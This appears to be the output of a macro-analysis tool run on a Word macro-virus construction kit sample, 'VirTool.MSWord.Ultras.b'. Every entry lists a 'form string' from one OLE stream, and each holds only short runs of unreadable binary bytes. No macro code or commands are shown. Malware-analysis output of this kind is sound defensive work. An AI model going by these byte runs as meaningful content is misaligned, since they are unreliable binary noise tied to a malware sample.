- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:���������������������BBC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'')���������**-..1225669���mmp??BAAECCF������������������>>A::>77:225--0''*������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޿�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
		
sss
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lPP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8���������������������AAA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RRS���������))+--0114558���mmo??BAAECCG������������������??C<<@99<447//2**,������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�����������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
￿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



DDD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j@@�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v������@@}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������((*--/114558���mmo??CBBEDDG������������������BBE??B;;>iik������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϯ��������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
῿��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
翿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h  �@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m@@�������@@z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������((*,,/113558���nnp@@CCCFEEI������������������DDHAAE>>A���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPS@@Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<@@{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�꿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
쏏�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@忿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʿ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѿ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dpp�������@@v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������''*,,/114558���nnqAADDDGFFJ������������������GGKEEHBBE���������������!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3@@u����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�꿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ֿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�������PP~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���WWW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������557--/114669���ooqBBFEEIHHL������������������KKOHHLFFIqqt������������&&(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)@@m������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ֿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�돏�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@Ư��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������yyz--022577:aac@@DDDHHHKbbe������������������OOSMMQJJNGGJBBF>>A������,,.%%'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^^_���BBC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@e������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⿿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˯�쿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������  +
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A������������00X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
